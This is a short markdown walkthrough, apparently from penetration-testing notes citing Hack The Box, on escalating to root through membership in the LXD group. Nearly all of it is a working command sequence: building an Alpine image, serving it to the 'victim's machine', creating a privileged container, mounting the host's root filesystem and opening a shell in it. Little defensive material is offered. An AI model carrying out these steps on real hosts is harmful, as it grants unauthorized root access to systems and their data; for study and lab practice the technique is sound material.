# LXD Group: Privilege Escalation

LXD is a daemon running as root.

Access control for LXD is based on **group membership**. The root user as well as members of the `lxd` group can *interact with the local daemon*. Anyone added to `lxd` group will have **full control** over **LXD**, which includes the ability to attach host devices and filesystems. Users can gain **root access to the host**.

**LXD-client** `lxc` is a command line tool to manage the LXD servers.

## Exploiting LXD Group Access

1. Check if current user is part of the high-privileged **LXD** group

        $ groups
        lxd

2. Clone the [LXD Alpine Linux image builder](https://github.com/saghul/lxd-alpine-builder) repository and build an alpine image

        git clone  https://github.com/saghul/lxd-alpine-builder.git
        cd lxd-alpine-builder
        ./build-alpine

3. Upload the alpine image (`filename.tar.gz`) to victim's machine

        python3 -m http.server 8080

4. Import this image into the image store (on victim's machine)

        lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias rootimage

5. Create a **privileged container** from the imported alpine image

        lxc init rootimage CONTAINER_NAME -c security.privileged=true

6. Mount the host file system to `/mnt/root` folder on the container

        lxc config device add CONTAINER_NAME mydevice disk source=/ path=/mnt/root recursive=true

7. Start the container

        lxc start CONTAINER_NAME

8. Get shell access on the privileged container

        lxc exec CONTAINER_NAME /bin/sh

9. Navigate to `/mnt/root/`

        cd /mnt/root/

## References

* https://www.hackthebox.eu/
* https://linuxcontainers.org/lxd/getting-started-cli/#initial-configuration
* https://linuxcontainers.org/lxd/docs/master/security
